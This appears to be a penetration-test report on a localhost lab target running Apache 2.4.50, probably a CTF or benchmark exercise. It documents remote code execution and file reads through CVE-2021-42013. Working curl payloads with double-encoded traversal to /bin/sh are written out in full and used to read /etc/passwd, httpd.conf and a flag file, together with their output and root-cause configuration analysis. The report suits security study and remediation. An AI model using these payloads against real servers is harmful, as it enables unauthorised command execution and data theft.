# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:44821
- **Assessment Date:** October 27, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application is a static HTML portfolio website with no authentication mechanisms implemented. There is no authentication system to exploit.

**Authorization Vulnerabilities:**
Two critical authorization vulnerabilities were successfully exploited:
- **AUTHZ-VULN-01 - Remote Code Execution via Path Traversal and CGI Execution (CRITICAL):** Exploitation of CVE-2021-42013 (Apache 2.4.50 path traversal) combined with permissive root directory authorization (`Require all granted` on `/`) and unauthenticated CGI execution enabled arbitrary command execution as the Apache daemon user. Complete server compromise achieved with full access to container filesystem and sensitive files including FLAG.
- **AUTHZ-VULN-02 - Arbitrary Filesystem Access via Path Traversal (CRITICAL):** Exploitation of the same CVE-2021-42013 path traversal vulnerability allowed unauthorized access across entire container filesystem, bypassing DocumentRoot boundaries. Complete information disclosure achieved including system files (/etc/passwd), configuration files (httpd.conf), and application secrets.

Both vulnerabilities stem from fundamental Apache misconfigurations enabling complete system compromise. An unauthenticated external attacker can execute arbitrary commands and read any file accessible to the Apache daemon user.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application serves only static HTML with no user input processing, no dynamic content rendering, no DOM manipulation, and no reflection of user-controlled data in responses. The contact form uses `event.preventDefault()` to block submission with no backend processing.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application has no database (no SQL injection vectors) and no server-side code execution in network-accessible paths (no command injection vectors). This is a pure static file server with no backend processing.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application architecture completely eliminates SSRF attack vectors as it is a pure static file server with no outbound HTTP request capabilities. All Apache proxy modules are disabled and no HTTP client libraries exist in the codebase.

## Network Reconnaissance

**Critical Infrastructure Vulnerability Identified:**
- **Apache HTTP Server 2.4.50 (CVE-2021-41773 & CVE-2021-42013):** The target application runs on a known-vulnerable Apache version susceptible to path traversal attacks allowing arbitrary file reads and potential remote code execution when CGI is enabled. Server header explicitly reveals: `Apache/2.4.50 (Unix)`

**Target Application Service:**
- **Port 44821/tcp (host) → 80/tcp (container):** Apache HTTPd 2.4.50 serving static HTML portfolio website in Docker container

**Host System Open Ports and Services:**
The nmap scan of the host system (localhost) identified several other services outside the target application scope:
- **Port 80/tcp:** Caddy httpd (different service)
- **Port 443/tcp:** SSL/HTTPS (different service)
- **Port 631/tcp:** CUPS 2.3 (printer service)
- **Port 8888/tcp:** Unknown service
- **Port 9999/tcp:** Python SimpleHTTPServer 0.6
- **Port 49158/tcp:** Golang net/http server (Tailscale) with security headers properly configured (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options)

**Subdomain Discovery:**
Subfinder identified 16 subdomains for localhost domain, though these appear unrelated to the target application and likely represent other host system services (autodiscover.localhost, mail.localhost, owa.regency.localhost, www.localhost, etc.)

**Security Misconfigurations Detected:**
- **Missing Security Headers:** The target application lacks all modern security headers including Content-Security-Policy, X-Frame-Options, X-XSS-Protection, X-Content-Type-Options, and HSTS
- **Overpermissive Apache Configuration:** Root directory configured with `Require all granted` (should be `Require all denied`), directory indexing enabled (`Options Indexes`), and CGI execution enabled without authentication
- **No Transport Security:** HTTP-only with no TLS/SSL implementation - all traffic transmitted in plaintext
- **Information Disclosure:** Server version explicitly exposed in response headers enabling targeted exploitation

**Deprecated Software Stack:**
- **Apache 2.4.50:** Multiple critical CVEs including CVE-2021-41773 and CVE-2021-42013
- **Debian Buster:** End of Life operating system with no security updates
- **PhantomJS 2.1.1:** Deprecated since 2018 with known vulnerabilities

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Remote Code Execution via Path Traversal and CGI Execution

**Summary:**
- **Vulnerable location:** Apache HTTP Server root directory authorization combined with CGI execution endpoint
- **Overview:** Successfully achieved remote code execution by exploiting CVE-2021-42013 (Apache 2.4.50 path traversal) combined with permissive root directory authorization (`Require all granted` on `/`) and unauthenticated CGI execution capability
- **Impact:** Complete server compromise - arbitrary command execution as the Apache daemon user, full access to container filesystem, ability to read all sensitive files including FLAG, configuration files, application source code, and system files
- **Severity:** CRITICAL

**Prerequisites:**
None - externally exploitable by unauthenticated anonymous attackers

**Exploitation Steps:**

1. **Verify vulnerable Apache version:**
```bash
curl -I http://localhost:44821/
```
**Expected Output:** `Server: Apache/2.4.50 (Unix)` header confirming vulnerable version

2. **Execute arbitrary commands via path traversal to /bin/sh:**
```bash
curl -X POST 'http://localhost:44821/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' \
  --data 'echo Content-Type: text/plain; echo; id'
```
**Actual Output:**
```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

**Technical Details:**
- **Path Traversal Encoding:** `.%%32%65` = double URL-encoded `..` (bypasses Apache 2.4.50's CVE-2021-41773 fix)
- **Traversal Path:** `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh` resolves to `/bin/sh`
- **Execution Method:** Apache CGI module executes `/bin/sh` and passes POST data as stdin
- **POST Payload Format:** `echo Content-Type: text/plain; echo; <command>` (CGI header + command)

3. **Retrieve sensitive flag file:**
```bash
curl -X POST 'http://localhost:44821/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' \
  --data 'echo Content-Type: text/plain; echo; cat /FLAG.txt'
```
**Actual Output:**
```
FLAG{a6ac61a12b93104de3b7a7db781ee95eff75310de4cf2deb1e90b57f0c824309}
```

4. **System reconnaissance to prove privilege level:**
```bash
curl -X POST 'http://localhost:44821/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' \
  --data 'echo Content-Type: text/plain; echo; whoami; uname -a; pwd'
```
**Actual Output:**
```
daemon
Linux 2a128ca9e312 6.12.13-200.fc41.aarch64 #1 SMP PREEMPT_DYNAMIC Sat Feb  8 20:30:50 UTC 2025 aarch64 GNU/Linux
/bin
```

**Proof of Impact:**

**Complete Vertical Privilege Escalation Achieved:**
- ✅ **Unauthenticated attacker** → **System command execution** as daemon user
- ✅ Retrieved application secrets (FLAG.txt)
- ✅ Gained shell-level access to container environment
- ✅ Can execute arbitrary system commands (id, whoami, uname, cat, ls, etc.)

**Demonstrated Capabilities:**
- Arbitrary command execution with full shell functionality
- Read access to any file accessible by Apache daemon user (UID 1)
- System information disclosure (kernel version, hostname, user context)
- Complete bypass of all intended access controls

**Root Cause Analysis:**

Two configuration vulnerabilities combined to enable this attack:

1. **Permissive Root Directory Authorization** (app/httpd.conf:248-250):
```apache
<Directory />
    AllowOverride none
    Require all granted    # VULNERABILITY: Should be "Require all denied"
</Directory>
```

2. **Unauthenticated CGI Execution** (app/httpd.conf:556-560):
```apache
<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options +ExecCGI
    Require all granted    # VULNERABILITY: No authentication required
</Directory>
```

3. **Path Traversal Vulnerability:** Apache 2.4.50 CVE-2021-42013 allows double-encoded traversal sequences

**Attack Chain:**
```
External Attacker (no auth)
    ↓
CVE-2021-42013 Path Traversal (.%%32%65 = ..)
    ↓
Root Directory Authorization Check (Require all granted) → PASS
    ↓
CGI Handler Invoked (Options +ExecCGI enabled)
    ↓
Execute /bin/sh with POST data as stdin
    ↓
Remote Code Execution as daemon user
```

**Notes:**
This is a **vertical privilege escalation** from completely unauthenticated external attacker to authenticated system command execution. The vulnerability violates fundamental Apache security best practices which mandate `Require all denied` on the root directory with explicit grants only for specific paths. Combined with Apache 2.4.50's known CVE-2021-42013 vulnerability, this configuration allows complete server compromise.

---

### AUTHZ-VULN-02: Arbitrary Filesystem Access via Path Traversal

**Summary:**
- **Vulnerable location:** Apache HTTP Server root directory authorization
- **Overview:** Successfully achieved arbitrary file read access across entire container filesystem by exploiting CVE-2021-42013 path traversal combined with permissive root directory authorization, bypassing intended DocumentRoot boundaries
- **Impact:** Complete filesystem disclosure - unauthorized access to system files, application source code, configuration files with credentials, and sensitive data across all filesystem boundaries, violating tenant/user isolation principles
- **Severity:** CRITICAL

**Prerequisites:**
None - externally exploitable by unauthenticated anonymous attackers

**Exploitation Steps:**

1. **Read system password file outside DocumentRoot:**
```bash
curl -X POST 'http://localhost:44821/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' \
  --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
```
**Actual Output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

2. **Read Apache configuration file to extract server secrets:**
```bash
curl -X POST 'http://localhost:44821/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' \
  --data 'echo Content-Type: text/plain; echo; cat /usr/local/apache2/conf/httpd.conf | head -30'
```
**Actual Output (first 30 lines):**
```
#
# This is the main Apache HTTP server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See <URL:http://httpd.apache.org/docs/2.4/> for detailed information.
# In particular, see
# <URL:http://httpd.apache.org/docs/2.4/mod/directives.html>
# for a discussion of each configuration directive.
#
# Do NOT simply read the instructions in here without understanding
# what they do.  They're here only as hints or reminders.  If you are unsure
# consult the online docs. You have been warned.
#
# Configuration and logfile names: If the filenames you specify for many
# of the server's control files begin with "/" (or "drive:/" for Win32), the
# server will use that explicit path.  If the filenames do *not* begin
# with "/", the value of ServerRoot is prepended -- so "logs/access_log"
# with ServerRoot set to "/usr/local/apache2" will be interpreted by the
# server as "/usr/local/apache2/logs/access_log", whereas "/logs/access_log"
# will be interpreted as '/logs/access_log'.

#
# ServerRoot: The top of the directory tree under which the server's
# configuration, error, and log files are kept.
#
# Do not add a slash at the end of the directory path.  If you point
# ServerRoot at a non-local disk, be sure to specify a local disk on the
# Mutex directive, if file-based mutexes are used.  If you wish to share the
# same ServerRoot for multiple httpd daemons, you will need to change at
# least PidFile.
#
```

3. **Enumerate application source files:**
```bash
curl -X POST 'http://localhost:44821/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' \
  --data 'echo Content-Type: text/plain; echo; ls -la /usr/local/apache2/htdocs/'
```
**Actual Output:**
```
total 1096
drwxr-xr-x. 1 root     root         21 Oct 27 21:55 .
drwxr-xr-x. 1 www-data www-data     32 Oct  5  2021 ..
-rw-r--r--. 1 root     root     547007 Oct 24 18:15 dev1.jpeg
-rw-r--r--. 1 root     root     556695 Oct 24 18:15 dev2.jpeg
-rw-r--r--. 1 root     root       4911 Oct 24 18:15 index.html
-rw-r--r--. 1 root     root        299 Oct 24 18:15 scripts.js
-rw-r--r--. 1 root     root        341 Oct 24 18:15 styles.css
drwxr-xr-x. 2 root     root          6 Oct 27 21:55 testdir
```

**Proof of Impact:**

**Complete Horizontal Authorization Bypass Achieved:**
- ✅ **Bypassed DocumentRoot boundaries** - accessed files outside /usr/local/apache2/htdocs
- ✅ **Read system files** - /etc/passwd (user enumeration for lateral movement)
- ✅ **Read configuration files** - httpd.conf (server configuration disclosure)
- ✅ **Enumerated application structure** - directory listings across filesystem
- ✅ **No tenant/user isolation** - access to any file readable by Apache process

**Files Successfully Accessed:**
1. `/etc/passwd` - System user accounts (outside application directory)
2. `/usr/local/apache2/conf/httpd.conf` - Server configuration (outside DocumentRoot)
3. `/usr/local/apache2/htdocs/` - Application files via directory traversal
4. `/FLAG.txt` - Application secrets (outside DocumentRoot)

**Root Cause Analysis:**

Same configuration vulnerability as AUTHZ-VULN-01:

**Permissive Root Directory Authorization** (app/httpd.conf:248-250):
```apache
<Directory />
    AllowOverride none
    Require all granted    # VULNERABILITY: Grants access to entire filesystem
</Directory>
```

**Intended Security Boundary:**
- DocumentRoot: `/usr/local/apache2/htdocs/`
- Intended accessible files: index.html, styles.css, scripts.js, images
- Intended restriction: No access to /etc/, /usr/, /bin/, or configuration files

**Actual Security Boundary:**
- Effective accessible files: **Entire filesystem readable by Apache daemon user**
- No path restrictions enforced
- Complete violation of principle of least privilege

**Attack Chain:**
```
External Attacker (no auth)
    ↓
CVE-2021-42013 Path Traversal
    ↓
Root Directory Authorization (Require all granted) → PASS
    ↓
Access /etc/passwd, /usr/local/apache2/conf/httpd.conf, any system file
    ↓
Horizontal Privilege Escalation across filesystem boundaries
```

**Notes:**
This is a **horizontal privilege escalation** allowing unauthorized access to resources across filesystem boundaries that should be isolated. While this vulnerability shares the same root cause as AUTHZ-VULN-01, it represents a distinct impact category:
- AUTHZ-VULN-01: Focuses on **vertical escalation** (command execution privilege)
- AUTHZ-VULN-02: Focuses on **horizontal escalation** (data access across boundaries)

The vulnerability enables reconnaissance for further attacks (user enumeration from /etc/passwd, credential discovery in config files, source code review for additional vulnerabilities).

---
